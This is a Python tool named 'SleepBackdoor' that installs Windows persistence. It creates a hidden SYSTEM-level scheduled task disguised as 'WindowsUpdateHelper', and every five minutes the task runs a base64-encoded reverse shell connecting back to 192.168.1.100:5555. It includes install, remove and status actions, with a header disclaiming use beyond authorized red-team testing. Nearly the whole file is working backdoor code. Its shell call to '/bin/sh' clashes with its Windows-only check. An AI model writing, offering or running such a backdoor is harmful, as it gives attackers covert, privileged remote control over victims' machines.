#!/usr/bin/env python3
# ======================================================================
# SleepBackdoor.py - Custom Fileless Windows Persistence via schtasks
# Hand-coded for authorized red-team lab testing / educational purposes
#
# Creates a hidden scheduled task that runs a Python one-liner reverse shell
# or custom payload every 5 minutes (adjustable) - minimal disk footprint
#
# IMPORTANT: FOR EDUCATIONAL & AUTHORIZED TESTING ONLY (EPO)
# Do NOT use on systems without explicit written permission
# ======================================================================

import os
import sys
import time
import base64
import subprocess
import argparse
import platform
import ctypes
import datetime
import getpass
import socket

# ==================== CONFIGURATION SECTION ====================
# CHANGE THESE BEFORE USE!

TASK_NAME = "WindowsUpdateHelper"                # Looks benign
TASK_DESCRIPTION = "Keeps Windows updated in background"
TASK_FREQUENCY_MIN = 5                           # Run every X minutes
RUN_AS_SYSTEM = True                             # True = SYSTEM context (higher priv), False = current user

# Payload: Python one-liner reverse shell (connect-back)
# You can replace this with your own encoded payload
REVERSE_SHELL_CODE = (
    "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
    "s.connect(('192.168.1.100',5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
    "os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
)

# Optional: encode payload with base64 for slight obfuscation
ENCODED_PAYLOAD = base64.b64encode(REVERSE_SHELL_CODE.encode()).decode()

# ============================================================

def is_admin():
    """Check if running as administrator (needed for SYSTEM tasks)"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False


def current_timestamp():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def run_command(cmd, check=True, shell=True, capture=True):
    """Helper: run system command with better error reporting"""
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            capture_output=capture,
            text=True,
            check=check,
            timeout=30
        )
        return result.stdout.strip() if capture else ""
    except subprocess.CalledProcessError as e:
        print(f"[!] Command failed: {e}")
        print(f"   Output: {e.output}")
        return None
    except subprocess.TimeoutExpired:
        print("[!] Command timed out")
        return None
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        return None


def create_persistence():
    """Create the scheduled task for persistence"""
    print(f"[{current_timestamp()}] Starting persistence installation...")

    if not is_admin():
        print("[!] This script requires Administrator privileges for full functionality.")
        print("   Run as admin to create SYSTEM-level task.")
        sys.exit(1)

    # Build the Python execution string (one-liner)
    # Uses -c to run inline code without needing a .py file on disk
    payload_cmd = (
        f'python -c "import base64,os;exec(base64.b64decode(\'{ENCODED_PAYLOAD}\').decode())"'
    )

    # schtasks command (hidden, SYSTEM context if chosen)
    schtasks_cmd = [
        "schtasks",
        "/create",
        "/tn", TASK_NAME,
        "/tr", payload_cmd,
        "/sc", "minute",
        "/mo", str(TASK_FREQUENCY_MIN),
        "/ru", "SYSTEM" if RUN_AS_SYSTEM else getpass.getuser(),
        "/rl", "highest",
        "/f",  # force overwrite if exists
        "/it" if not RUN_AS_SYSTEM else "",  # interactive only if not SYSTEM
        "/xml" if False else ""  # we use simple params
    ]

    # Add description
    schtasks_cmd.extend(["/de", TASK_DESCRIPTION])

    # Run the task creation
    print(f"[{current_timestamp()}] Creating scheduled task: {TASK_NAME}")
    result = run_command(" ".join(schtasks_cmd), capture=False)

    if result is None:
        print("[!] Failed to create task. Check logs / permissions.")
        return False

    # Enable the task
    enable_cmd = f'schtasks /change /tn "{TASK_NAME}" /enable'
    run_command(enable_cmd, capture=False)

    print(f"[{current_timestamp()}] Persistence installed successfully!")
    print(f"   Task: {TASK_NAME}")
    print(f"   Frequency: every {TASK_FREQUENCY_MIN} minutes")
    print(f"   Context: {'SYSTEM' if RUN_AS_SYSTEM else 'Current User'}")
    print(f"   Payload: Python inline reverse shell (connect-back)")

    # Quick status check
    time.sleep(2)
    check_status()

    return True


def remove_persistence():
    """Clean up the scheduled task"""
    print(f"[{current_timestamp()}] Removing persistence...")

    delete_cmd = f'schtasks /delete /tn "{TASK_NAME}" /f'
    result = run_command(delete_cmd, capture=False)

    if result is None:
        print("[!] Task deletion may have failed - check manually.")
    else:
        print(f"[{current_timestamp()}] Scheduled task '{TASK_NAME}' deleted successfully.")

    # Optional: kill any running instances (basic attempt)
    kill_cmd = f'taskkill /im python.exe /f >nul 2>&1'
    run_command(kill_cmd, check=False)

    return True


def check_status():
    """Check if the task exists and its status"""
    print(f"[{current_timestamp()}] Checking task status...")
    query_cmd = f'schtasks /query /tn "{TASK_NAME}"'
    output = run_command(query_cmd)

    if output:
        print("\nTask Details:")
        print("-" * 60)
        for line in output.splitlines():
            if line.strip():
                print("   " + line.strip())
        print("-" * 60)
    else:
        print("Task not found or access denied.")


def main():
    parser = argparse.ArgumentParser(
        description="SleepBackdoor - Fileless Windows Persistence via schtasks",
        epilog="EPO - For authorized red-team / educational use only"
    )

    parser.add_argument(
        "action",
        choices=["install", "remove", "status"],
        help="Action: install | remove | status"
    )

    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Show more detailed output"
    )

    args = parser.parse_args()

    if platform.system() != "Windows":
        print("[!] This tool is Windows-only")
        sys.exit(1)

    print("=" * 70)
    print("SleepBackdoor - Custom Fileless Persistence Tool")
    print("Educational & Authorized Testing Only (EPO)")
    print("=" * 70)
    print()

    if args.action == "install":
        create_persistence()
    elif args.action == "remove":
        remove_persistence()
    elif args.action == "status":
        check_status()

    print("\nDone.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Operation cancelled by user")
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        sys.exit(1)